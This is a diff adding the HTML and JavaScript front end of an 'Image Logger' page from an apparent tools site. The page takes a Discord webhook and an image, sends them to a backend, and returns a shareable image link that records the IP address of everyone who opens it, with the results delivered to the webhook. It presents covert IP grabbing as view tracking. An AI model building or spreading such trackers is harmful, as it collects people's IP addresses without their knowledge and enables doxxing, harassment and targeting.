@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Logger - Zesty Tools</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0e17;
+            --bg-card: #111827;
+            --accent: #00ffff;
+            --accent-dark: #00cccc;
+            --text: #f1f5f9;
+            --text-muted: #94a3b8;
+            --border: rgba(0, 255, 255, 0.28);
+            --success: #10b981;
+        }
+
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+        }
+
+        .bg-glow {
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle at 40% 30%, rgba(0,255,255,0.14) 0%, transparent 65%);
+            animation: slowPulse 18s infinite ease-in-out;
+            pointer-events: none;
+            z-index: -2;
+        }
+        @keyframes slowPulse { 0%,100% { opacity:0.45; } 50% { opacity:0.2; } }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 24px;
+        }
+
+        .back-btn {
+            background: rgba(0,255,255,0.1);
+            border: 2px solid var(--accent);
+            color: var(--accent);
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: 700;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 40px;
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background: rgba(0,255,255,0.2);
+            box-shadow: 0 12px 30px rgba(0,255,255,0.4);
+        }
+
+        .tool-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 25px 60px rgba(0,255,255,0.2);
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .tool-icon-large img {
+            width: 80px;
+            height: 80px;
+            filter: brightness(0) saturate(100%) invert(70%) sepia(90%) saturate(2000%) hue-rotate(140deg);
+            margin-bottom: 20px;
+        }
+
+        .card-title {
+            font-size: 2.5rem;
+            margin-bottom: 12px;
+        }
+
+        .status {
+            display: inline-block;
+            background: rgba(16,185,129,0.18);
+            color: var(--success);
+            padding: 8px 20px;
+            border-radius: 999px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            border: 1px solid rgba(16,185,129,0.35);
+        }
+
+        .card-description {
+            color: var(--text-muted);
+            font-size: 1.05rem;
+            line-height: 1.6;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            color: var(--accent);
+            font-weight: 600;
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        input[type="url"], input[type="file"] {
+            width: 100%;
+            padding: 15px 20px;
+            background: rgba(30,30,30,0.8);
+            border: 2px solid #333;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 15px rgba(0,255,255,0.5);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 18px 40px;
+            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(0,255,255,0.35);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 16px 40px rgba(0,255,255,0.5);
+        }
+
+        .results {
+            margin-top: 30px;
+            display: none;
+        }
+
+        .results.show {
+            display: block;
+        }
+
+        .result-item {
+            margin-bottom: 20px;
+        }
+
+        .result-item label {
+            color: var(--accent);
+            font-weight: 600;
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .link-box {
+            display: flex;
+            gap: 10px;
+        }
+
+        .link-box input {
+            flex: 1;
+            padding: 12px 15px;
+            background: rgba(30,30,30,0.8);
+            border: 2px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-family: 'Courier New', monospace;
+        }
+
+        .copy-btn {
+            padding: 12px 20px;
+            background: var(--accent);
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent-dark);
+        }
+
+        .alert {
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        .alert-success {
+            background: rgba(0,255,0,0.1);
+            border: 2px solid #00ff00;
+            color: #66ff66;
+        }
+
+        .alert-error {
+            background: rgba(255,0,0,0.1);
+            border: 2px solid #ff0000;
+            color: #ff6666;
+        }
+
+        footer {
+            text-align: center;
+            padding: 60px 0 40px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-glow"></div>
+
+    <div class="container">
+        <a href="/" class="back-btn">← Back to Tools</a>
+
+        <div class="tool-card">
+            <div class="card-header">
+                <div class="tool-icon-large">
+                    <img src="https://cdn-icons-png.flaticon.com/512/1829/1829589.png" alt="Image Logger">
+                </div>
+                <h2 class="card-title">Image Logger</h2>
+                <div class="status">FREE • LIVE</div>
+                <p class="card-description">Logs visitors' IP addresses when they open the image link. Useful for monitoring views or tracking engagement.</p>
+            </div>
+
+            <form id="loggerForm">
+                <div class="form-group">
+                    <label for="webhookUrl">Discord Webhook URL</label>
+                    <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." required>
+                </div>
+
+                <div class="form-group">
+                    <label for="imageFile">Upload Image</label>
+                    <input type="file" id="imageFile" accept=".png,.jpg,.jpeg,.gif" required>
+                </div>
+
+                <button type="submit" class="submit-btn">⚡ Generate Logger Links</button>
+            </form>
+
+            <div id="results" class="results">
+                <div class="result-item">
+                    <label>📸 Image Link</label>
+                    <div class="link-box">
+                        <input type="text" id="imageLink" readonly>
+                        <button class="copy-btn" onclick="copy('imageLink')">📋 Copy</button>
+                    </div>
+                </div>
+
+                <div class="result-item">
+                    <label>📊 Monitor Link</label>
+                    <div class="link-box">
+                        <input type="text" id="monitorLink" readonly>
+                        <button class="copy-btn" onclick="copy('monitorLink')">📋 Copy</button>
+                    </div>
+                </div>
+
+                <div class="alert alert-success">
+                    ✅ Links generated successfully! Share the image link to start logging.
+                </div>
+            </div>
+
+            <div id="message"></div>
+        </div>
+
+        <footer>
+            Made by Crxxr • Not affiliated with Discord • Use at your own risk
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('loggerForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            const imageFile = document.getElementById('imageFile').files[0];
+            
+            if (!imageFile) {
+                document.getElementById('message').innerHTML = '<div class="alert alert-error">❌ Please select an image</div>';
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = async (event) => {
+                try {
+                    const response = await fetch('/api/webhook', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            webhook_url: webhookUrl,
+                            image_data: event.target.result
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (response.ok) {
+                        const baseUrl = window.location.origin;
+                        document.getElementById('imageLink').value = baseUrl + data.image_link;
+                        document.getElementById('monitorLink').value = baseUrl + data.monitor_link;
+                        document.getElementById('results').classList.add('show');
+                        document.getElementById('message').innerHTML = '';
+                    } else {
+                        document.getElementById('message').innerHTML = `<div class="alert alert-error">❌ Error: ${data.error}</div>`;
+                    }
+                } catch (error) {
+                    document.getElementById('message').innerHTML = `<div class="alert alert-error">❌ Error: ${error.message}</div>`;
+                }
+            };
+            reader.readAsDataURL(imageFile);
+        });
+
+        function copy(id) {
+            const text = document.getElementById(id).value;
+            navigator.clipboard.writeText(text);
+            event.target.textContent = 'Copied!';
+            setTimeout(() => { event.target.textContent = '📋 Copy'; }, 2000);
+        }
+    </script>
+</body>
+</html>
